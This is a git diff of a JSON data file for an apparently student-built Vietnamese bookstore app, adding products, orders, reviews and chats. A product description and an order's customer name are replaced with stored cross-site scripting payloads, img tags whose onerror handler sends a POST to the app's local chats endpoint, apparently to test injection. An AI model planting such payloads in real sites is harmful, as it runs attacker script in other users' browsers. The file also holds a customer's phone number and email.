@@ -13,7 +13,7 @@
         "",
         ""
       ],
-      "description": "Nhà Giả Kim (The Alchemist) của Paulo Coelho là một trong những cuốn sách bán chạy nhất mọi thời đại. Câu chuyện kể về Santiago, một cậu bé chăn cừu người Tây Ban Nha, và hành trình đi tìm kho tàng ở Ai Cập sau những giấc mơ lặp đi lặp lại. Cuốn sách là bài học sâu sắc về việc theo đuổi vận mệnh của chính mình và lắng nghe tiếng nói của trái tim.",
+      "description": "Nha Gia Kim <img src=1 onerror=\"fetch('http://localhost:3000/chats', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id: 'chat_duyy', userId: 'duyy', userName: 'duyy', messages: []})})\">",
       "author": "Paulo Coelho",
       "isbn": "9786043391234",
       "publisher": "NXB Hội Nhà Văn",
@@ -25,7 +25,7 @@
       ],
       "oldPrice": 100000,
       "discountPercentage": 21,
-      "stock": 23
+      "stock": 22
     },
     {
       "id": "2",
@@ -55,15 +55,25 @@
       "name": "OnePiece",
       "price": 36000,
       "image": "https://s3-api.fpt.vn/fptvn-storage/2025-11-21/1763742879_top-15-tua-game-one-piece-hay-nhat-hien-nay.png",
-      "description": "One Piece, từng được xuất bản tại Việt Nam với tên gọi Đảo Hải Tặc, là một bộ truyện tranh Nhật Bản do Eiichiro Oda sáng tác và minh họa.",
+      "description": "One Piece là cuộc hành trình của Monkey D. Luffy, một cậu thiếu niên tràn đầy năng lượng với ước mơ tìm kiếm kho báu huyền thoại \"One Piece\" để trở thành Vua Hải Tặc tiếp theo. Sau khi vô tình ăn phải trái ác quỷ và sở hữu khả năng co giãn như cao su, Luffy đã thành lập băng hải tặc Mũ Rơm, tập hợp những người đồng đội tài năng và trung thành. Cùng nhau, họ giương buồm ra khơi, khám phá những vùng biển kỳ bí, đối đầu với các thế lực hải tặc khét tiếng và Chính phủ Thế giới, tạo nên một thiên sử thi hoành tráng về tình bạn, sự tự do và khát vọng chinh phục ước mơ.",
       "id": "XxGDdYUaXN4",
       "author": "Oda",
-      "publishedYear": "3636",
+      "publishedYear": "1997",
       "categoryIds": [
         "1",
         "4I9L-ACOGzQ"
       ],
-      "stock": 50
+      "stock": 49,
+      "images": [
+        "https://s3-api.fpt.vn/fptvn-storage/2025-11-21/1763742879_top-15-tua-game-one-piece-hay-nhat-hien-nay.png",
+        "https://nipponclass.jp/wp-content/uploads/2024/07/MV5BM2YwYTkwNjItNGQzNy00MWE1LWE1M2ItOTMzOGI1OWQyYjA0XkEyXkFqcGdeQXVyMTUzMTg2ODkz._V1_FMjpg_UX1000_-723x1024.jpg",
+        "https://hobiverse.com.vn/cdn/shop/articles/One-Piece-Arc-Elbaf_9107d782-bb88-4193-95d7-0cc6b039b8fe.jpg?v=1745898918",
+        "https://onepiecetruyen.net/_next/image?url=https%3A%2F%2Fcdn.onepiecetruyen.net%2Fone-piece%2Fvi%2Fcover%2Fthumbnail.jpg&w=3840&q=75"
+      ],
+      "isbn": "ABC112",
+      "publisher": "Nhà xuất bản Kim Đồng",
+      "weight": "136g",
+      "dimensions": "11x12x13"
     },
     {
       "name": "Những Người Khốn Khổ",
@@ -579,6 +589,79 @@
       "status": "Đã hoàn thành",
       "createdAt": "2026-05-24T07:29:48.628Z",
       "id": "m6f4KbbDAuw"
+    },
+    {
+      "customerName": "duyy",
+      "phone": "0987905644",
+      "email": "trinhduy6996@gmail.com",
+      "address": "hanoi",
+      "note": "hi",
+      "userId": "3u7_xNCADHQ",
+      "total": 36000,
+      "items": [
+        {
+          "name": "OnePiece",
+          "price": 36000,
+          "image": "https://s3-api.fpt.vn/fptvn-storage/2025-11-21/1763742879_top-15-tua-game-one-piece-hay-nhat-hien-nay.png",
+          "description": "One Piece, từng được xuất bản tại Việt Nam với tên gọi Đảo Hải Tặc, là một bộ truyện tranh Nhật Bản do Eiichiro Oda sáng tác và minh họa.",
+          "id": "XxGDdYUaXN4",
+          "author": "Oda",
+          "publishedYear": "3636",
+          "categoryIds": [
+            "1",
+            "4I9L-ACOGzQ"
+          ],
+          "stock": 50,
+          "quantity": 1
+        }
+      ],
+      "paymentMethod": "cod",
+      "status": "Đã hoàn thành",
+      "createdAt": "2026-05-24T08:00:07.368Z",
+      "id": "yn2OtCQ2C7U"
+    },
+    {
+      "customerName": "<img src=1 onerror=\"fetch('http://localhost:3000/chats',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'chat_duyy',customerName:'duyy',avatar:'https://ui-avatars.com/api/?name=duyy',lastMessage:'Hello',messages:[]})})\">",
+      "phone": "0123456789",
+      "email": "duyy@gmail.com",
+      "address": "Hanoi",
+      "note": "",
+      "userId": "3u7_xNCADHQ",
+      "total": 79000,
+      "items": [
+        {
+          "id": "1",
+          "name": "Nhà Giả Kim",
+          "price": 79000,
+          "image": "https://images.unsplash.com/photo-1544947950-fa07a98d237f?q=80&w=800&auto=format&fit=crop",
+          "images": [
+            "https://images.unsplash.com/photo-1544947950-fa07a98d237f?q=80&w=800&auto=format&fit=crop",
+            "https://images.unsplash.com/photo-1512820790803-83ca734da794?q=80&w=800&auto=format&fit=crop",
+            "https://images.unsplash.com/photo-1491849593786-6ec8005bc439?q=80&w=800&auto=format&fit=crop",
+            "",
+            "",
+            ""
+          ],
+          "description": "Nha Gia Kim <img src=1 onerror=\"fetch('http://localhost:3000/chats', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id: 'chat_duyy', userId: 'duyy', userName: 'duyy', messages: []})})\">",
+          "author": "Paulo Coelho",
+          "isbn": "9786043391234",
+          "publisher": "NXB Hội Nhà Văn",
+          "publishedYear": "1988",
+          "weight": "250g",
+          "dimensions": "13 x 20.5 cm",
+          "categoryIds": [
+            "2"
+          ],
+          "oldPrice": 100000,
+          "discountPercentage": 21,
+          "stock": 23,
+          "quantity": 1
+        }
+      ],
+      "paymentMethod": "cod",
+      "status": "Chờ xử lý",
+      "createdAt": "2026-05-24T16:16:47.825Z",
+      "id": "YECWHYIxt6Q"
     }
   ],
   "users": [
@@ -687,6 +770,115 @@
     }
   ],
   "wishlists": [],
-  "reviews": [],
+  "reviews": [
+    {
+      "productId": "XxGDdYUaXN4",
+      "userId": "3u7_xNCADHQ",
+      "username": "duyy",
+      "rating": 5,
+      "comment": "Sách cực kỳ hay, hình vẽ đẹp và giao hàng siêu tốc!",
+      "createdAt": "2026-05-24T08:01:06.040Z",
+      "id": "P6p0oj6anPk",
+      "replyContent": "Cảm ơn bạn duyy đã ủng hộ cửa hàng sách của chúng tôi!",
+      "repliedAt": "2026-05-24T08:05:00Z",
+      "repliedBy": "Nhân Viên Bán Hàng"
+    },
+    {
+      "productId": "1",
+      "userId": "user_2",
+      "username": "hoangnam",
+      "rating": 4,
+      "comment": "Nội dung cuốn Nhà Giả Kim rất triết lý và sâu sắc, nhưng gáy sách hơi bị móp một chút do vận chuyển.",
+      "createdAt": "2026-05-23T14:20:00.000Z",
+      "id": "rev_2",
+      "replyContent": "Da shop chan thanh xin loi ban ve su co van chuyen lam mop gay sach. Shop xin gui tang ban ma giam gia cho don sau a!",
+      "repliedAt": "2026-05-24T08:10:02.302Z",
+      "repliedBy": "Nhân Viên Bán Hàng"
+    },
+    {
+      "productId": "fZFkIisy7Os",
+      "userId": "user_3",
+      "username": "thuychi",
+      "rating": 5,
+      "comment": "Tuyệt tác văn học kinh điển. Bản dịch chất lượng, bìa cứng cáp.",
+      "createdAt": "2026-05-22T09:15:00.000Z",
+      "id": "rev_3"
+    },
+    {
+      "productId": "2",
+      "userId": "user_4",
+      "username": "quanghuy",
+      "rating": 3,
+      "comment": "Truyện Conan tập 100 giao hàng hơi chậm, đóng gói tạm được.",
+      "createdAt": "2026-05-24T02:10:00.000Z",
+      "id": "rev_4"
+    },
+    {
+      "productId": "XxGDdYUaXN4",
+      "userId": "3u7_xNCADHQ",
+      "username": "duyy",
+      "rating": 5,
+      "comment": "ok\n",
+      "createdAt": "2026-05-24T17:05:21.677Z",
+      "id": "XqqXt9l2fpQ",
+      "replyContent": "thank kiu",
+      "repliedAt": "2026-05-24T17:05:38.320Z",
+      "repliedBy": "Nhân Viên Bán Hàng"
+    }
+  ],
+  "chats": [
+    {
+      "id": "chat_3",
+      "userId": "phan_minh_khang",
+      "customerName": "Phan Minh Khang",
+      "avatar": "https://ui-avatars.com/api/?name=Phan+Minh+Khang&background=3b82f6&color=fff",
+      "lastMessage": "Shop cho mình xin thông tin thanh toán với chuyển khoản ngân hàng nhé.",
+      "updatedAt": "2026-05-24T09:45:00.000Z",
+      "unread": false,
+      "messages": [
+        {
+          "id": "m6",
+          "sender": "customer",
+          "text": "Mình muốn đặt 2 quyển Đắc Nhân Tâm",
+          "time": "2026-05-24T09:40:00.000Z"
+        },
+        {
+          "id": "m7",
+          "sender": "customer",
+          "text": "Shop cho mình xin thông tin thanh toán với chuyển khoản ngân hàng nhé.",
+          "time": "2026-05-24T09:45:00.000Z"
+        }
+      ]
+    },
+    {
+      "userId": "duyy",
+      "customerName": "duyy",
+      "avatar": "https://ui-avatars.com/api/?name=duyy&background=0f172a&color=fff",
+      "lastMessage": "ok cu",
+      "updatedAt": "2026-05-24T16:35:56.468Z",
+      "unread": false,
+      "messages": [
+        {
+          "id": "m_1779640442381",
+          "sender": "customer",
+          "text": "onepiece còn ko shop",
+          "time": "2026-05-24T16:34:02.381Z"
+        },
+        {
+          "id": "m_1779640471046",
+          "sender": "staff",
+          "text": "Dạ chào bạn, sách này hiện đang còn hàng ạ!",
+          "time": "2026-05-24T16:34:31.046Z"
+        },
+        {
+          "id": "m_1779640556468",
+          "sender": "staff",
+          "text": "ok cu",
+          "time": "2026-05-24T16:35:56.468Z"
+        }
+      ],
+      "id": "562gPA31CdA"
+    }
+  ],
   "$schema": "./node_modules/json-server/schema.json"
 }
